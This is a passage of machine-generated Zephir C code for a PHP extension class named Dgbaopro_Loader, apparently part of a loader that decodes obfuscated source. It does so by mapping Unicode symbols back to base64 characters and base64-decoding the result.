	ZVAL_STRING(&_4, "⊊");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊯");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊖");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊅");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋅");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋂");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊵");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊃");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋁");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊢");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊳");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊇");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊴");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊭");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊉");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋄");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊤");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊱");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋇");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊒");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊜");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊶");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊩");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊗");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊣");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊙");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋈");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊪");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊷");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊥");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊬");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊈");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊛");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋆");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋃");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊮");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊞");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊲");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊟");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊋");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊁");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊡");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊦");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊧");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊘");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊿");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊀");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊨");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊰");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊫");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊠");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊝");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊕");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊚");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊄");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊆");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊏");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊑");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_VAR(&_5);
	zephir_create_array(&_5, 67, 0);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "y");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "M");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "m");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "A");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "x");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "r");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "F");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "T");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "X");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "B");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "q");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "v");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "w");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "t");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "Y");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "N");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "d");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "V");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "4");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "C");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "P");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "j");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "h");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "u");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "5");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "U");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "a");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "S");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "1");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "k");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "o");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "z");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "R");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "L");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "Q");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "l");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "s");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "0");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "g");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "K");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "D");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "8");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "E");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "e");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "3");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "n");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "J");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "G");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "b");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "Z");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "f");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "7");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "c");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "9");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "p");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "H");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "W");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "i");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "O");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "I");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "6");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "2");
	zephir_array_fast_append(&_5, &_4);
	zephir_fast_str_replace(&_2, &_3, &_5, &s);
	zephir_get_strval(&s, &_2);
	ZEPHIR_INIT_VAR(&_8);
	ZEPHIR_CONCAT_SSSSSSSSSSSSSSSSSSSSS(&_8, "D", "o", "7", "2", "8", "3", "8", "3", "y", "3", "6", "3", "7", "3", "8", "8", "3", "h", "d", "j", "d");
	ZEPHIR_CALL_STATIC(&_6, "_", &_7, 11, &s, &_8);
	zephir_check_call_status();
	zephir_get_strval(&s, &_6);
	RETURN_CTOR(&s);
}

PHP_METHOD(Dgbaopro_Loader, ____________)
{
	zval _5$$3, _7$$3;
	zend_bool _1, _12$$4;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zephir_fcall_cache_entry *_9 = NULL, *_14 = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zval *__param = NULL, *___param = NULL, _0, _2, _3$$3, _4$$3, _6$$3, _8$$3, _10$$4, _11$$4, _13$$4, _15$$5;
	zval _, __;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&__);
	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&_2);
	ZVAL_UNDEF(&_3$$3);
	ZVAL_UNDEF(&_4$$3);
	ZVAL_UNDEF(&_6$$3);
	ZVAL_UNDEF(&_8$$3);
	ZVAL_UNDEF(&_10$$4);
	ZVAL_UNDEF(&_11$$4);
	ZVAL_UNDEF(&_13$$4);
	ZVAL_UNDEF(&_15$$5);
	ZVAL_UNDEF(&_5$$3);
	ZVAL_UNDEF(&_7$$3);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(2, 2)
		Z_PARAM_STR(_)
		Z_PARAM_STR(__)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 2, 0, &__param, &___param);
	zephir_get_strval(&_, __param);
	zephir_get_strval(&__, ___param);


	zephir_read_static_property_ce(&_0, dgbaopro_loader_ce, SL("p"), PH_NOISY_CC | PH_READONLY);
	_1 = zephir_is_true(&_0);
	if (_1) {
		zephir_read_static_property_ce(&_2, dgbaopro_loader_ce, SL("l"), PH_NOISY_CC | PH_READONLY);
		_1 = zephir_is_true(&_2);
	}
	if (_1) {
		ZEPHIR_CALL_FUNCTION(&_3$$3, "base64_decode", NULL, 6, &_);
		zephir_check_call_status();
		zephir_get_strval(&_, &_3$$3);
		ZEPHIR_INIT_VAR(&_4$$3);
		ZEPHIR_INIT_VAR(&_5$$3);
		zephir_create_array(&_5$$3, 67, 0);
		ZEPHIR_INIT_VAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊃");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊶");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊇");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊗");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊩");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊭");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊳");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊥");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊖");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊄");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊅");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊒");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⋀");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊑");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊰");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⋅");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊜");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊚");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⋂");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊏");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⋄");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊁");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊡");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊵");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊬");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⋆");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊝");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊴");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊛");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊲");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊕");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⋃");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊫");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊋");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊱");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊣");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⋈");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊯");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊦");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⋁");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊢");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊊");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊆");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊈");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊾");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊀");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊘");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊙");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊧");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊷");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊉");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊞");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊮");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⋇");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊟");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊤");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊐");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊠");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊂");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊨");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊪");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "⊿");
		zephir_array_fast_append(&_5$$3, &_6$$3);
		ZEPHIR_INIT_VAR(&_7$$3);
		zephir_create_array(&_7$$3, 67, 0);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "R");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "L");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "t");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "i");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "p");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "l");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "2");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "e");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "G");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "h");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "g");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "y");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "O");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "8");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
		ZVAL_STRING(&_6$$3, "E");
		zephir_array_fast_append(&_7$$3, &_6$$3);
		ZEPHIR_INIT_NVAR(&_6$$3);
